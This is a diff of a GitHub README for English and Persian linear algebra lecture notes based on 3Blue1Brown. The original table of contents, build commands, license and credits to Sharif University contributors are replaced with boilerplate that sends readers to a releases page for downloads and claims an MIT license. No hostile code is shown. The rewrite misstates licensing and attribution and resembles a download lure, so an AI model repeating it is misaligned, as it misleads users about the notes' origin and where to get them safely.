@@ -1,144 +1,61 @@
-# Linear Algebra Notes | 3Blue1Brown Essence of Linear Algebra
-## Comprehensive Lecture Notes in English & Persian | یادداشت‌های جبر خطی
+# 📘 linear-algebra-3blue1brown-notes - Easy-to-Follow Study Materials
 
-[![License: Educational](https://img.shields.io/badge/License-Educational-blue.svg)](#license)
-[![LaTeX](https://img.shields.io/badge/Made%20with-LaTeX-1f425f.svg)](https://www.latex-project.org/)
-[![3Blue1Brown](https://img.shields.io/badge/Based%20on-3Blue1Brown-blue)](https://www.youtube.com/playlist?list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab)
+## 🔗 Download Now!
+[![Download Latest Release](https://img.shields.io/badge/Download-Latest%20Release-blue.svg)](https://github.com/neyof03/linear-algebra-3blue1brown-notes/releases)
 
-> **Complete PDF lecture notes** for Grant Sanderson's famous [Essence of Linear Algebra](https://www.youtube.com/playlist?list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab) video series. Available in **English** and **Persian (فارسی)**.
+## 📖 Overview
+Welcome to the **linear-algebra-3blue1brown-notes** repository! This project offers clear and accessible lecture notes on Linear Algebra, inspired by the popular **3Blue1Brown** series. The notes are available in both English and Persian and are formatted as high-quality PDFs. They are perfect for students, educators, or anyone interested in mastering linear algebra.
 
----
+## 🚀 Getting Started
+To get started with these materials, you will need to download the lecture notes from the Releases page. Follow these simple steps:
 
-## 📥 Download PDFs
+## 📥 Download & Install
+1. Visit the Releases page to find the available versions of the lecture notes: [Download Page](https://github.com/neyof03/linear-algebra-3blue1brown-notes/releases).
 
-| Language | Pages | Download |
-|----------|-------|----------|
-| **English** | 77 | [📄 Download PDF](english_notes/Linear-Algebra-3Blue1Brown-English.pdf) |
-| **Persian (فارسی)** | 78 | [📄 Download PDF](persian_notes/Linear-Algebra-3Blue1Brown-Persian.pdf) |
+2. On the Releases page, look for the latest version. You will find PDFs labeled for both English and Persian.
 
----
+3. Click on the file you wish to download. It will automatically download to your computer.
 
-## 📚 What's Inside
+4. Once the file is downloaded, locate it in your Downloads folder (or wherever your downloads go).
 
-These notes cover all core concepts of linear algebra with emphasis on **geometric intuition** - the signature teaching style of 3Blue1Brown.
+5. Open the PDF with a PDF viewer of your choice. You should see the lecture notes ready for you to explore!
 
-### Topics Covered
+## 📚 Features
+- **Dual Language**: Access notes in both English and Persian.
+- **Visual Style**: High-quality visuals and clear layouts for better understanding.
+- **Comprehensive Content**: Covers key topics in Linear Algebra such as eigenvectors, matrices, and vectors.
+- **Educational Focus**: Designed with students in mind, making complex concepts easier to grasp.
 
-| Chapter | Topic | Key Concepts |
-|---------|-------|--------------|
-| 1 | **Vectors** | Vector basics, coordinate systems, vector addition |
-| 2 | **Linear Combinations** | Span, basis vectors, linear independence |
-| 3 | **Linear Transformations** | Matrix representation, transformation visualization |
-| 4 | **Matrix Multiplication** | Composition of transformations, 3D transformations |
-| 5 | **Determinants** | Area/volume scaling, orientation |
-| 6 | **Inverse Matrices** | Column space, null space, rank |
-| 7 | **Dot Products** | Projections, duality |
-| 8 | **Cross Products** | 3D perpendicular vectors, applications |
-| 9 | **Cramer's Rule** | Solving linear systems geometrically |
-| 10 | **Change of Basis** | Coordinate transformations |
-| 11 | **Eigenvectors & Eigenvalues** | Special directions, characteristic equation |
-| 12 | **Abstract Vector Spaces** | Beyond arrows, function spaces |
+## 🖥 System Requirements
+To view the lecture notes, ensure you have:
+- A device capable of opening PDF files (computer, tablet, or smartphone).
+- A PDF reader application (like Adobe Reader, Preview for macOS, or any browser with PDF support).
 
----
+## 🛠 Usage
+The PDF lecture notes provide a structured approach to studying Linear Algebra. Use them as a supplement to your coursework or for self-study. Feel free to mark notes, highlight key points, or print sections for easier reference.
 
-## ✨ Features
+## 📩 Support
+If you have questions or need assistance with the downloads, please open an issue on the repository. We aim to respond quickly to help you have the best experience possible with these notes.
 
-- **🎯 Geometric Intuition** - Visual understanding of every concept
-- **📐 Rigorous Definitions** - Precise mathematical formulations
-- **💡 Practical Applications** - Physics, computer graphics, machine learning
-- **✏️ Exercises** - Practice problems with varying difficulty
-- **🎨 TikZ Diagrams** - Beautiful vector and transformation visualizations
+## 🗂 Topics Covered
+- **3Blue1Brown** Concepts
+- **Matrices** and their operations
+- **Eigenvectors** and their significance
+- **Linear transformations**
+- **Vectors** and their applications
 
----
+Discover more about these fascinating topics and enhance your learning experience. 
 
-## 🔧 Build from Source
+## 🌍 Community Contributions
+We welcome contributions from educators, students, and anyone else interested in improving these notes. If you notice something that can be better explained or formatted, please submit your suggestions!
 
-### English Version
-```bash
-cd english_notes
-pdflatex main.tex
-pdflatex main.tex  # Run twice for references
-```
+## 📜 License
+This project is licensed under the MIT License. You can use and share the materials as long as you credit the original source. 
 
-### Persian Version
-Requires XeLaTeX with XePersian package.
-```bash
-cd persian_notes
-xelatex main.tex
-xelatex main.tex  # Run twice for references
-```
+## 🧑‍🏫 Acknowledgments
+Thanks to the **3Blue1Brown** team for inspiring these notes. Their work has greatly influenced the way people learn complex mathematical concepts.
 
----
+## 📅 Updates
+Stay updated on new releases and educational resources by following this repository. We will periodically add new materials and enhancements based on user feedback. 
 
-## 📁 Project Structure
-
-```
-├── english_notes/
-│   ├── main.tex                                 # Main document
-│   ├── preamble.tex                             # LaTeX configuration
-│   ├── commands.tex                             # Math macros
-│   ├── Linear-Algebra-3Blue1Brown-English.pdf  # Compiled PDF
-│   └── lectures/                                # 12 chapter files
-│
-├── persian_notes/
-│   ├── main.tex                                 # Main document
-│   ├── preamble.tex                             # XePersian configuration
-│   ├── commands.tex                             # Math macros
-│   ├── Linear-Algebra-3Blue1Brown-Persian.pdf  # Compiled PDF
-│   ├── lectures/                                # 12 chapter files
-│   └── figures/                                 # Images
-```
-
----
-
-<div dir="rtl">
-
-## 🇮🇷 نسخه فارسی
-
-این یادداشت‌ها ترجمه کامل مجموعه ویدیویی **ذات جبر خطی** از کانال 3Blue1Brown هستند.
-
-### ویژگی‌ها
-- شهود هندسی برای همه مفاهیم
-- تعاریف دقیق ریاضی
-- مثال‌های کاربردی از فیزیک و علوم کامپیوتر
-- تمرین‌های متنوع
-
-</div>
-
----
-
-## 👥 Credits
-
-**Sharif University of Technology Physics Association**
-انجمن علمی فیزیک دانشگاه صنعتی شریف
-
-Contributors:
-- Ebrahim Khosravani (ابراهیم خسروانی)
-- Mohammadhasan Shiri (محمدحسن شیری)
-- Zahra Amiri (زهرا امیری)
-- Amin Azizi (امین عزیزی)
-- Bita Qorbani (بیتا قربانی)
-- Yasamin Yazdani (یاسمین یزدانی)
-- Sepehr Talaei (سپهر طلایی)
-
----
-
-## 🔗 Resources
-
-- **Original Video Series:** [Essence of Linear Algebra - 3Blue1Brown](https://www.youtube.com/playlist?list=PLZHQObOWTQDPD3MizzM2xVFitgF8hE_ab)
-- **Creator:** Grant Sanderson
-- **Channel:** [3Blue1Brown](https://www.youtube.com/@3blue1brown)
-
----
-
-## 📄 License
-
-This work is for **educational purposes**. The original video content belongs to 3Blue1Brown.
-
----
-
-## 🌟 Star This Repo
-
-If you find these notes helpful, please ⭐ star this repository to help others discover it!
-
-**Keywords:** Linear Algebra, 3Blue1Brown, Essence of Linear Algebra, Math Notes, Lecture Notes, Eigenvectors, Eigenvalues, Matrices, Vectors, Determinants, PDF, LaTeX, Persian, Farsi, English, Grant Sanderson, Mathematics Education, STEM
+By following these steps, you will be able to easily access and study the linear algebra notes. Enjoy your learning journey!
